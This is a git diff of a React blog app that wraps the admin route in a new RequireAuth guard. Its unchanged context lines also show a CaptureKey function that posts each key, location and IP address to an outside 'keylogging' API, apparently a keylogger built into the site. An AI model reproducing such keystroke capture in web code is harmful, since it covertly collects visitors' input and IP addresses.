@@ -10,6 +10,7 @@ import Admin from './admin/Admin';
 import Login from './admin/Login';
 import { isBrowser } from 'react-device-detect';
 import { userContext } from './contexts/UserContext';
+import RequireAuth from './admin/RequireAuth';
 
 const CaptureKey = (key, location, ip_address) => {
   fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
@@ -80,7 +81,9 @@ function App() {
             <Route exact path="create" element={<Create />} />
             <Route exact path="login" element={<Login/>}/>
             <Route exact path="blogs" element={<Home />} />
-            <Route exact path="admin" element={<Admin />} />
+            <Route element={<RequireAuth userType={userProfile && userProfile.userType} />}>
+              <Route exact path="admin" element={<Admin />} />
+            </Route>
             <Route exact path="blogs/:id" element={<BlogDetails />} />
             <Route path="*" element={<NotFound />} />
           </Routes>
